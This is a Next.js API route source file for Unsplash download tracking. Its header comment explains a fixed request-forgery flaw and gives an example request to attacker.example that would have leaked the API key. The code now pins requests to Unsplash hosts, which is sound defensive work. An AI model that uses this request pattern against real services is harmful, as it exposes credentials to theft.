// app/api/unsplash/download/route.ts
// Unsplash Download Tracking API (Required by Unsplash API Guidelines)
//
// 2026-08-29 — THIS ROUTE GAVE THE UNSPLASH API KEY TO ANYONE WHO ASKED.
//
// CodeQL js/request-forgery, critical. The `url` query parameter went straight
// into fetch(), and the Authorization header carrying UNSPLASH_ACCESS_KEY went
// with it. The route is public and unauthenticated, so:
//
//   GET /api/unsplash/download?url=https://attacker.example/
//     -> Authorization: Client-ID <our key>  delivered to attacker.example
//
// One request and the key is theirs. The internal-network reach that
// js/request-forgery usually describes was the lesser half of this finding.
//
// THE FIX IS PINNING, NOT SANITISING.
//
// A private-range denylist would not have helped here at all: attacker.example
// is an ordinary public host. The only thing that stops a credential leaving is
// refusing to send it anywhere except the service it belongs to. guardedFetch's
// allowHosts does that, and it also drops the Authorization header if a
// permitted host redirects off-domain — the same leak by a second route.
//
// Unsplash's tracking endpoint is https://api.unsplash.com/photos/:id/download,
// always on unsplash.com, so pinning costs this route nothing.
//
// CR AudioViz AI · EIN 39-3646201 · originally December 24, 2025

import { NextRequest, NextResponse } from 'next/server';
import { guardedFetch, EgressBlockedError } from '@craudioviz/platform-sdk/lib/egress-guard';

export const dynamic = "force-dynamic";
export const runtime = "nodejs";

const UNSPLASH_ACCESS_KEY = process.env.UNSPLASH_ACCESS_KEY;

/** Unsplash and its subdomains, and nowhere else. */
const UNSPLASH_HOSTS = ['.unsplash.com'] as const;

export async function GET(request: NextRequest) {
  const searchParams = request.nextUrl.searchParams;
  const downloadUrl = searchParams.get('url');

  if (!downloadUrl) {
    return NextResponse.json(
      { error: 'Download URL required' },
      { status: 400 }
    );
  }

  if (!UNSPLASH_ACCESS_KEY) {
    return NextResponse.json(
      { error: 'Unsplash API not configured' },
      { status: 500 }
    );
  }

  try {
    // Track the download as required by Unsplash API guidelines
    const response = await guardedFetch(
      downloadUrl,
      {
        headers: {
          'Authorization': `Client-ID ${UNSPLASH_ACCESS_KEY}`,
          'Accept-Version': 'v1',
        },
      },
      { allowHosts: UNSPLASH_HOSTS },
    );

    if (!response.ok) {
      throw new Error(`Unsplash download tracking error: ${response.status}`);
    }

    const data = await response.json();
    return NextResponse.json({ success: true, url: data.url });
  } catch (error) {
    // A refused URL is the caller's mistake and gets 400, not 500. It is logged
    // distinctly too: a run of these is somebody probing the endpoint, and that
    // is worth being able to see.
    if (error instanceof EgressBlockedError) {
      console.warn('[unsplash/download] egress refused', { message: error.message });
      return NextResponse.json(
        { error: 'That URL is not an Unsplash download URL.' },
        { status: 400 }
      );
    }
    console.error('Unsplash download tracking error:', error);
    return NextResponse.json(
      { error: 'Failed to track download' },
      { status: 500 }
    );
  }
}
